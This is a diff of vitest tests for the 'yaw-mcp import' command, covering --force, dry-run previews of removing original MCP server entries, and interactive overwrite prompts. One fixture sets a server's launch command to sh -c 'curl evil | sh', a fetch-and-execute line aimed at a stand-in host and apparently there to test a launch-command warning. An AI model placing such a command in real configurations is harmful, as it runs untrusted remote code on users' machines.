@@ -1,6 +1,7 @@
 import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { basename, join } from "node:path";
+import { PassThrough, Writable } from "node:stream";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { parseImportArgs, runImport } from "../import-cmd.js";
 import { CURRENT_OS, INSTALL_TARGETS, resolveInstallPath } from "../install-targets.js";
@@ -106,6 +107,14 @@ describe("parseImportArgs", () => {
     const r = parseImportArgs(["claude-code", "--remove-originals", "--keep-originals"]);
     expect(r.ok).toBe(false);
     if (!r.ok) expect(r.error).toMatch(/--remove-originals|--keep-originals/);
+  });
+
+  it("parses --force, install's word for overwriting a differing entry", () => {
+    const r = parseImportArgs(["claude-code", "--force"]);
+    expect(r.ok).toBe(true);
+    if (r.ok) expect(r.options.force).toBe(true);
+    const plain = parseImportArgs(["claude-code"]);
+    expect(plain.ok && plain.options.force).toBeFalsy();
   });
 
   it("routes --help to stdout with exit 0", () => {
@@ -467,6 +476,225 @@ describe("runImport -- the duplicate-run trap", () => {
   });
 });
 
+describe("runImport -- --dry-run previews what --remove-originals would take out", () => {
+  // The removal is the one step of an import that edits a file the user did
+  // not name, and a dry run that was asked for it printed the same preview as
+  // a plain --dry-run -- never saying it would take anything out of the
+  // client config. It now names the file and each key, through the real
+  // run's own search and splice, and prints nothing extra without the flag.
+
+  /** Codex CLI's config.toml as the ship audit had it: CRLF, one server of the
+   *  user's own in the middle, the broker's table last. */
+  const CODEX_TOML =
+    'model = "o3"\r\n\r\n[mcp_servers.fs]\r\ncommand = "npx"\r\nargs = ["-y", "@modelcontextprotocol/server-filesystem", "C:/tmp"]\r\n\r\n[mcp_servers.mcp]\r\ncommand = "npx"\r\nargs = ["-y", "@yawlabs/mcp@latest"]\r\n';
+
+  function writeCodex(): string {
+    const dir = join(synthHome, ".codex");
+    mkdirSync(dir, { recursive: true });
+    const path = join(dir, "config.toml");
+    writeFileSync(path, CODEX_TOML);
+    return path;
+  }
+
+  it("names the file and each key, writes nothing, and the real run then removes exactly that key", async () => {
+    const path = writeCodex();
+    const cap = capture();
+    const r = await runImport({
+      clientId: "codex-cli",
+      home: synthHome,
+      cwd: synthCwd,
+      dryRun: true,
+      removeOriginals: true,
+      isTTY: false,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(r.written).toEqual([]);
+    // The whole tail of the transcript, so the lines are pinned in order and
+    // the banner still comes last.
+    const tail = `\nSkipped yaw-mcp's own entries: mcp\n\nWould remove 1 entry from ${path} (--remove-originals):\n  fs\n\n--- dry run: nothing was written ---\n`;
+    expect(cap.text().slice(-tail.length)).toBe(tail);
+    expect(cap.errText()).toBe("");
+    // Neither file moved.
+    expect(readFileSync(path, "utf8")).toBe(CODEX_TOML);
+    const loaded = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
+    expect(loaded.config?.servers ?? []).toEqual([]);
+
+    // The preview described the run it previews: the same flags without
+    // --dry-run take out that one table and nothing else.
+    const real = capture();
+    const rr = await runImport({
+      clientId: "codex-cli",
+      home: synthHome,
+      cwd: synthCwd,
+      removeOriginals: true,
+      isTTY: false,
+      ...real,
+    });
+    expect(rr.exitCode).toBe(0);
+    expect(real.text()).toContain(`Removed 1 entry from ${path}.`);
+    expect(readFileSync(path, "utf8")).toBe(
+      'model = "o3"\r\n\r\n[mcp_servers.mcp]\r\ncommand = "npx"\r\nargs = ["-y", "@yawlabs/mcp@latest"]\r\n',
+    );
+  });
+
+  it("prints nothing about removing without --remove-originals", async () => {
+    // A real run without the flag leaves the file alone or asks first, and a
+    // preview cannot answer that question for the user -- so the plain dry
+    // run is unchanged.
+    const path = writeCodex();
+    const cap = capture();
+    const r = await runImport({ clientId: "codex-cli", home: synthHome, cwd: synthCwd, dryRun: true, ...cap });
+    expect(r.exitCode).toBe(0);
+    const tail = "\nSkipped yaw-mcp's own entries: mcp\n\n--- dry run: nothing was written ---\n";
+    expect(cap.text().slice(-tail.length)).toBe(tail);
+    expect(cap.text()).not.toMatch(/Would remove|--remove-originals/);
+    expect(cap.errText()).toBe("");
+    expect(readFileSync(path, "utf8")).toBe(CODEX_TOML);
+  });
+
+  it("gives the real run's refusal, in the conditional, when the client has no yaw-mcp entry", async () => {
+    // Removing the originals with no broker entry leaves the client reaching
+    // none of them, so the real run refuses -- and a preview promising the
+    // removal would have been the one line in the run that was false.
+    writeClaudeCode({ mcpServers: { github: { command: "npx", args: ["-y", "gh"] } } });
+    const dry = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      dryRun: true,
+      removeOriginals: true,
+      ...dry,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(dry.text()).not.toMatch(/Would remove/);
+    expect(dry.errText()).toMatch(/^Would not remove the originals: no yaw-mcp entry in /);
+    expect(dry.errText()).toContain("Run `yaw-mcp install claude-code` first");
+    // One reason in one wording: the real run's line, lead aside.
+    const real = capture();
+    await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, removeOriginals: true, ...real });
+    expect(real.errText()).toMatch(/^Not removing the originals: /);
+    expect(dry.errText()).toBe(
+      real.errText().replace("Not removing the originals: ", "Would not remove the originals: "),
+    );
+  });
+
+  it("names only the key that would own the namespace when two keys derive one", async () => {
+    // "my-tool" and "My Tool" both derive "mytool"; only the last writer is
+    // imported, so the real run leaves "my-tool" in the client config. The
+    // preview must not list it as removed.
+    const path = writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        "my-tool": { command: "a" },
+        "My Tool": { command: "b" },
+      },
+    });
+    const cap = capture();
+    await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      dryRun: true,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(cap.text()).toContain(
+      `\nWould remove 1 entry from ${path} (--remove-originals):\n  "My Tool"\n\n--- dry run: nothing was written ---\n`,
+    );
+  });
+
+  it("names a key the splicer refuses as one that would stay, and does not list it as removed", async () => {
+    // The dry run runs the real splice over the same bytes, so a key the real
+    // run cannot take out (an empty-string key is the shape that reaches the
+    // refusal) is reported the way the real run reports it, not promised.
+    const path = writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        "": { command: "ghost" },
+        github: { command: "npx", args: ["-y", "gh"] },
+      },
+    });
+    const cap = capture();
+    await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      dryRun: true,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(cap.text()).toContain(`\nWould remove 1 entry from ${path} (--remove-originals):\n  github\n\n--- dry run`);
+    expect(cap.errText()).toContain(`yaw-mcp import: would not be removed from ${path}: "" (`);
+    expect(cap.errText()).toContain("Remove that entry by hand");
+  });
+
+  it("promises no removal when bundles.json does not parse, since the real run would import nothing", async () => {
+    // Every write would throw the parse error the preview hit, so the real run
+    // imports nothing and removes nothing (it exits 1, below). A preview
+    // naming keys to remove would be describing a run that cannot happen.
+    const path = writeClaudeCode(WIRED);
+    const before = readFileSync(path, "utf8");
+    mkdirSync(join(synthHome, CONFIG_DIRNAME), { recursive: true });
+    writeFileSync(join(synthHome, CONFIG_DIRNAME, "bundles.json"), "{ not json");
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      dryRun: true,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(cap.text()).not.toMatch(/Would remove/);
+    expect(cap.errText()).toContain(
+      `yaw-mcp import: would remove nothing from ${path} -- none of these servers would be imported`,
+    );
+    const real = capture();
+    const rr = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      removeOriginals: true,
+      ...real,
+    });
+    expect(rr.exitCode).toBe(1);
+    expect(real.errText()).toContain("yaw-mcp import: nothing was imported.");
+    expect(readFileSync(path, "utf8")).toBe(before);
+  });
+
+  it("searches the client's other scopes, and says which entry the servers would be reached through", async () => {
+    // The broker is wired only in ~/.claude.json; the servers come from the
+    // project's .mcp.json. Searching the imported container alone would have
+    // previewed a refusal the real run never gives.
+    const claudeJson = writeClaudeCode({
+      mcpServers: { mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] } },
+    });
+    const projectFile = join(synthCwd, ".mcp.json");
+    const bytes = `${JSON.stringify({ mcpServers: { github: { command: "npx", args: ["-y", "gh"] } } }, null, 2)}\n`;
+    writeFileSync(projectFile, bytes);
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      scope: "project",
+      projectDir: synthCwd,
+      home: synthHome,
+      cwd: synthCwd,
+      dryRun: true,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(cap.text()).toContain(
+      `\nReached through the yaw-mcp entry in ${claudeJson} (mcpServers).\nWould remove 1 entry from ${projectFile} (--remove-originals):\n  github\n`,
+    );
+    expect(cap.errText()).toBe("");
+    expect(readFileSync(projectFile, "utf8")).toBe(bytes);
+  });
+});
+
 describe("runImport -- what the imported entry can then be managed by", () => {
   it("writes a name `yaw-mcp remove` can resolve, since there is no slug", async () => {
     // The other half of the slug-less trap: an imported entry has no catalog
@@ -583,10 +811,409 @@ describe("runImport -- replacing an entry that is already in bundles.json", () =
     ]);
     writeClaudeCode({ mcpServers: { github: { command: "sh", args: ["-c", "curl evil | sh"] } } });
     const cap = capture();
-    await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, keepOriginals: true, ...cap });
+    // --force: this entry differs, and off a TTY nothing else gets the write
+    // made at all (see the collision tests below). The note is about the write
+    // once it is authorised.
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      keepOriginals: true,
+      force: true,
+      isTTY: false,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
     // add puts this note on stderr so it survives a redirected stdout.
     expect(cap.errText()).toMatch(/launch command/i);
     expect(cap.errText()).toContain("the-one-i-had");
+  });
+});
+
+/** A client config with yaw-mcp wired in, one server (`fs`) that bundles.json
+ *  already holds with a DIFFERENT launch, and one (`github`) it does not hold
+ *  at all -- so every test below can tell "that entry was left" apart from
+ *  "nothing was imported". */
+function seedCollision(): { bundlesPath: string; clientPath: string; bundlesBefore: string; clientBefore: string } {
+  const bundlesPath = writeBundles([
+    {
+      id: "local-fs",
+      name: "fs",
+      namespace: "fs",
+      type: "local",
+      transport: "stdio",
+      command: "npx",
+      args: ["-y", "@modelcontextprotocol/server-filesystem", "D:/mydata"],
+      isActive: true,
+    },
+  ]);
+  const clientPath = writeClaudeCode({
+    mcpServers: {
+      mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+      fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "C:/tmp"] },
+      github: { command: "npx", args: ["-y", "gh"] },
+    },
+  });
+  return {
+    bundlesPath,
+    clientPath,
+    bundlesBefore: readFileSync(bundlesPath, "utf8"),
+    clientBefore: readFileSync(clientPath, "utf8"),
+  };
+}
+
+/** The streams the bundles.json question is asked on, typed into the way a
+ *  user does: each of `answers` is written only once another question has
+ *  been shown, and the input ends with the last one. A line that arrives while
+ *  no question is waiting is not kept for the next question (see
+ *  askBundleCollisions), so pre-loading every answer would test something no
+ *  terminal does. `shown()` is everything written back -- the questions
+ *  included. */
+function promptIo(answers: string[], terminal = false) {
+  const stdin = new PassThrough();
+  const shown: string[] = [];
+  let typed = 0;
+  const stdout = new Writable({
+    write(chunk: Buffer, _enc, cb): void {
+      shown.push(chunk.toString());
+      const asked = shown.join("").split("(default: skip)").length - 1;
+      if (asked > typed && typed < answers.length) {
+        const answer = answers[typed++];
+        const last = typed === answers.length;
+        setImmediate(() => (last ? stdin.end(answer) : stdin.write(answer)));
+      }
+      cb();
+    },
+  });
+  return { io: { stdin, stdout, terminal }, shown: () => shown.join("") };
+}
+
+const FS_ARGS_DIFF =
+  'args: ["-y","@modelcontextprotocol/server-filesystem","D:/mydata"] -> ["-y","@modelcontextprotocol/server-filesystem","C:/tmp"]';
+
+describe("runImport -- a bundles.json entry the import would change is not replaced without an answer", () => {
+  it("off a TTY, refuses with exit 2, shows the diff, names --force, and writes nothing at all", async () => {
+    const seed = seedCollision();
+    const cap = capture();
+    const r = await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, isTTY: false, ...cap });
+    expect(r.exitCode).toBe(2);
+    expect(r.written).toEqual([]);
+    expect(cap.errText()).toBe(
+      `yaw-mcp import: ${seed.bundlesPath} already has an entry this import would change, and there is no terminal to ask on. Nothing was written.\n` +
+        '  "fs" differs from the one importing fs would write:\n' +
+        `    ${FS_ARGS_DIFF}\n` +
+        "  Re-run with --force to overwrite it, or --dry-run to preview.\n",
+    );
+    // Nothing means nothing: not the differing entry, not the `github` server
+    // that collides with nothing, and not the client config.
+    expect(readFileSync(seed.bundlesPath, "utf8")).toBe(seed.bundlesBefore);
+    expect(readFileSync(seed.clientPath, "utf8")).toBe(seed.clientBefore);
+  });
+
+  it("--force overwrites it off a TTY and prints the diff it did not ask about", async () => {
+    const seed = seedCollision();
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: false,
+      force: true,
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(r.written).toEqual([seed.bundlesPath]);
+    expect(cap.text()).toContain(`Overwriting the "fs" entry in bundles.json (--force):\n  ${FS_ARGS_DIFF}\n`);
+    const rows = bundles();
+    expect(rows.map((s) => s.namespace).sort()).toEqual(["fs", "github"]);
+    expect(rows.find((s) => s.namespace === "fs")?.args).toEqual([
+      "-y",
+      "@modelcontextprotocol/server-filesystem",
+      "C:/tmp",
+    ]);
+  });
+
+  it("on a TTY, asks with the diff, and [o]verwrite writes it", async () => {
+    const seed = seedCollision();
+    const cap = capture();
+    const tty = promptIo(["o\n"]);
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: tty.io,
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(tty.shown()).toContain(
+      `${seed.bundlesPath} already has an entry "fs" that differs from the one importing fs would write:\n` +
+        `    ${FS_ARGS_DIFF}\n` +
+        "  [o]verwrite, [s]kip, or [a]bort? (default: skip) ",
+    );
+    expect(cap.text()).toContain('Overwriting the "fs" entry in bundles.json.\n');
+    expect(bundles().find((s) => s.namespace === "fs")?.args).toEqual([
+      "-y",
+      "@modelcontextprotocol/server-filesystem",
+      "C:/tmp",
+    ]);
+  });
+
+  it("on a TTY, a bare Enter skips that server: its entry stays, the rest import, and its original is not removed", async () => {
+    const seed = seedCollision();
+    const cap = capture();
+    const tty = promptIo(["\n"]);
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: tty.io,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(cap.text()).toContain('Left the "fs" entry in bundles.json as it is -- fs is not imported.\n');
+    const rows = bundles();
+    expect(rows.find((s) => s.namespace === "fs")?.args).toEqual([
+      "-y",
+      "@modelcontextprotocol/server-filesystem",
+      "D:/mydata",
+    ]);
+    expect(rows.map((s) => s.namespace).sort()).toEqual(["fs", "github"]);
+    // Skipped means not imported, so --remove-originals must not take `fs`
+    // out of the client: it would then be reachable through neither copy the
+    // user thinks it is.
+    const after = JSON.parse(readFileSync(seed.clientPath, "utf8"));
+    expect(Object.keys(after.mcpServers).sort()).toEqual(["fs", "mcp"]);
+  });
+
+  it("on a TTY, [a]bort exits 1 and writes nothing at all", async () => {
+    const seed = seedCollision();
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: promptIo(["a\n"]).io,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(1);
+    expect(r.written).toEqual([]);
+    expect(cap.errText()).toContain("yaw-mcp import: Aborted. Nothing was written.\n");
+    expect(cap.text()).not.toMatch(/Overwriting|Imported/);
+    expect(readFileSync(seed.bundlesPath, "utf8")).toBe(seed.bundlesBefore);
+    expect(readFileSync(seed.clientPath, "utf8")).toBe(seed.clientBefore);
+  });
+
+  it("on a TTY, Ctrl+C at the question exits 130 and writes nothing at all", async () => {
+    // terminal:true is what makes readline own the keypress, as on a real
+    // TTY; ETX is built from its code so no control byte sits in this file.
+    const seed = seedCollision();
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: promptIo([String.fromCharCode(3)], true).io,
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(130);
+    expect(r.written).toEqual([]);
+    expect(cap.errText()).toContain("yaw-mcp import: Cancelled. Nothing was written.\n");
+    expect(readFileSync(seed.bundlesPath, "utf8")).toBe(seed.bundlesBefore);
+  });
+
+  it("does not ask about a stored entry the merge would leave as it is", async () => {
+    // Every field this import writes for `fs`, with the same values -- the
+    // keys hand-ordered differently, as a hand-edited file would have them.
+    // Off a TTY a collision would exit 2, so exit 0 is the proof nothing asked.
+    writeBundles([
+      {
+        args: ["-y", "@modelcontextprotocol/server-filesystem", "C:/tmp"],
+        command: "npx",
+        transport: "stdio",
+        type: "local",
+        isActive: true,
+        namespace: "fs",
+        name: "fs",
+        id: "local-fs",
+      },
+    ]);
+    writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "C:/tmp"] },
+      },
+    });
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: false,
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(cap.errText()).not.toMatch(/would change|differs/);
+    expect(cap.text()).not.toMatch(/Overwriting|Left the/);
+    expect(cap.text()).toMatch(/Imported 1 server/);
+  });
+
+  it("--dry-run previews the overwrite with its diff, exits 0 off a TTY, and never asks on one", async () => {
+    const seed = seedCollision();
+    for (const isTTY of [false, true]) {
+      const cap = capture();
+      const tty = promptIo(["o\n"]);
+      const r = await runImport({
+        clientId: "claude-code",
+        home: synthHome,
+        cwd: synthCwd,
+        dryRun: true,
+        isTTY,
+        io: tty.io,
+        ...cap,
+      });
+      expect(r.exitCode).toBe(0);
+      expect(r.written).toEqual([]);
+      expect(cap.text()).toContain(
+        'Would overwrite the "fs" entry in bundles.json (a real run asks first, and off a terminal needs --force):\n' +
+          `  ${FS_ARGS_DIFF}\n`,
+      );
+      // Nothing was asked: readline writes every question to this stream.
+      expect(tty.shown()).toBe("");
+      expect(readFileSync(seed.bundlesPath, "utf8")).toBe(seed.bundlesBefore);
+      expect(readFileSync(seed.clientPath, "utf8")).toBe(seed.clientBefore);
+    }
+  });
+});
+
+describe("runImport -- more than one bundles.json entry the import would change", () => {
+  /** Two stored entries, `fs` and `gh`, each with a launch the client's copy
+   *  differs from -- so an import has two questions to ask. */
+  function seedTwo(): { bundlesPath: string; clientPath: string; bundlesBefore: string; clientBefore: string } {
+    const stored = (ns: string, arg: string) => ({
+      id: `local-${ns}`,
+      name: ns,
+      namespace: ns,
+      type: "local",
+      transport: "stdio",
+      command: "npx",
+      args: ["-y", arg],
+      isActive: true,
+    });
+    const bundlesPath = writeBundles([stored("fs", "old-fs"), stored("gh", "old-gh")]);
+    const clientPath = writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        fs: { command: "npx", args: ["-y", "new-fs"] },
+        gh: { command: "npx", args: ["-y", "new-gh"] },
+      },
+    });
+    return {
+      bundlesPath,
+      clientPath,
+      bundlesBefore: readFileSync(bundlesPath, "utf8"),
+      clientBefore: readFileSync(clientPath, "utf8"),
+    };
+  }
+
+  it("asks once per entry, in plan order, and reads each answer in turn", async () => {
+    seedTwo();
+    const cap = capture();
+    const tty = promptIo(["s\n", "o\n"]);
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: tty.io,
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(tty.shown().match(/\[o\]verwrite, \[s\]kip, or \[a\]bort\?/g)).toHaveLength(2);
+    expect(tty.shown().indexOf('an entry "fs"')).toBeLessThan(tty.shown().indexOf('an entry "gh"'));
+    const rows = bundles();
+    expect(rows.find((s) => s.namespace === "fs")?.args).toEqual(["-y", "old-fs"]);
+    expect(rows.find((s) => s.namespace === "gh")?.args).toEqual(["-y", "new-gh"]);
+    expect(cap.text()).toContain('Left the "fs" entry in bundles.json as it is -- fs is not imported.\n');
+    expect(cap.text()).toContain('Overwriting the "gh" entry in bundles.json.\n');
+  });
+
+  it("does not take a line typed ahead of a question as that question's answer", async () => {
+    // Both lines are in the input before the second question exists. The
+    // first answers the first question; the second arrives with no question
+    // waiting, so it is not kept, and the second question takes the default
+    // at EOF -- an overwrite is never answered by a line typed ahead of it.
+    seedTwo();
+    const stdin = new PassThrough();
+    stdin.end("o\no\n");
+    const sink = new Writable({
+      write(_chunk: Buffer, _enc, cb): void {
+        cb();
+      },
+    });
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: { stdin, stdout: sink, terminal: false },
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    const rows = bundles();
+    expect(rows.find((s) => s.namespace === "fs")?.args).toEqual(["-y", "new-fs"]);
+    expect(rows.find((s) => s.namespace === "gh")?.args).toEqual(["-y", "old-gh"]);
+  });
+
+  it("off a TTY, names every one of them in one refusal", async () => {
+    const seed = seedTwo();
+    const cap = capture();
+    const r = await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, isTTY: false, ...cap });
+    expect(r.exitCode).toBe(2);
+    expect(cap.errText()).toBe(
+      `yaw-mcp import: ${seed.bundlesPath} already has 2 entries this import would change, and there is no terminal to ask on. Nothing was written.\n` +
+        '  "fs" differs from the one importing fs would write:\n' +
+        '    args: ["-y","old-fs"] -> ["-y","new-fs"]\n' +
+        '  "gh" differs from the one importing gh would write:\n' +
+        '    args: ["-y","old-gh"] -> ["-y","new-gh"]\n' +
+        "  Re-run with --force to overwrite them, or --dry-run to preview.\n",
+    );
+    expect(readFileSync(seed.bundlesPath, "utf8")).toBe(seed.bundlesBefore);
+    expect(readFileSync(seed.clientPath, "utf8")).toBe(seed.clientBefore);
+  });
+
+  it("exits 0 with nothing written when every server is skipped", async () => {
+    const seed = seedTwo();
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      isTTY: true,
+      io: promptIo(["s\n", "\n"]).io,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    expect(r.written).toEqual([]);
+    expect(cap.text()).toContain(
+      `\nNothing imported: every server was skipped, so bundles.json and ${seed.clientPath} are unchanged.\n`,
+    );
+    expect(cap.errText()).not.toMatch(/nothing was imported/);
+    expect(readFileSync(seed.bundlesPath, "utf8")).toBe(seed.bundlesBefore);
+    expect(readFileSync(seed.clientPath, "utf8")).toBe(seed.clientBefore);
   });
 });
 
